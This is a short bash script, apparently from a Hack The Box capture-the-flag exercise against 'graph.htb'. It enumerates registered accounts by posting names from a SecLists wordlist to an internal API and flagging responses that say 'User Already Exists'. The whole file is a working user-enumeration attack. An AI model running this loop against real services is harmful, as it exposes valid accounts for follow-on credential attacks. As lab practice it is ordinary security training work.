```bash
#!/bin/bash

function ctrl_c(){
   echo -e "\n\n[!] Saliendo... \n"
   tput cnorm; exit 1
}

# Ctrl+C
trap ctrl_c INT

tput civis

function createJSON(){

  username=$1
cat <<EOF
   {"email":"$username@graph.htb"}
EOF
}




echo;
cat /usr/share/seclists/Usernames/Names/malenames-usa-top1000.txt | tr '[A-Z]' '[a-z]' | while read username; do
   if [ "$(curl -s -X POST "http://internal-api-graph.htb/api/code" -d "$(createJSON $username)" -H "Content-Type: application/json" | grep "User Already Exists")" ]; then
     echo "[+] El email $username@graph.htb esta registrado"
   fi
done
tput cnorm
````

